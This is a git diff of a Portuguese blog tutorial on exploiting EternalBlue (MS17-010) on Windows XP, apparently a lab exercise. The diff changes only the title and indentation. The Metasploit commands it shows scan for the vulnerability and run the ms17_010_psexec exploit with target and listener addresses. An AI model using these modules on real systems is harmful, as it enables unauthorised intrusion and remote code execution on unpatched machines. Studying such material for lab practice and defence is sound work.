@@ -1,5 +1,5 @@
 ---
-title: Eternal Blue ( WinXP )
+title: Exploitation - Eternal Blue ( WinXP )
 category: post
 ---
 
@@ -23,11 +23,11 @@ OR
 
 ### Primeiramente Verificamos se a maquina de destino eh um Windows XP Vuln
 
-	use auxiliary/scanner/smb/smb_ms17_010
+		use auxiliary/scanner/smb/smb_ms17_010
 
-	set RHOST 10.l0.1.4
+		set RHOST 10.l0.1.4
 
-	exploit
+		exploit
 
 Se tudo der certo, obtemos uma resposta parecida com o seguinte:
 
@@ -40,12 +40,12 @@ Se tudo der certo, obtemos uma resposta parecida com o seguinte:
 ## Agora Vamos Explorar a maquina que identificamos que esta vulneravel
 
 
-	back
+		back
 
-	use exploit/windows/smb/ms17_010_psexec
+		use exploit/windows/smb/ms17_010_psexec
 
-	set RHOST 10.l0.1.4
+		set RHOST 10.l0.1.4
 
-	set LHOST 10.l0.1.2
+		set LHOST 10.l0.1.2
 
-	run
+		run
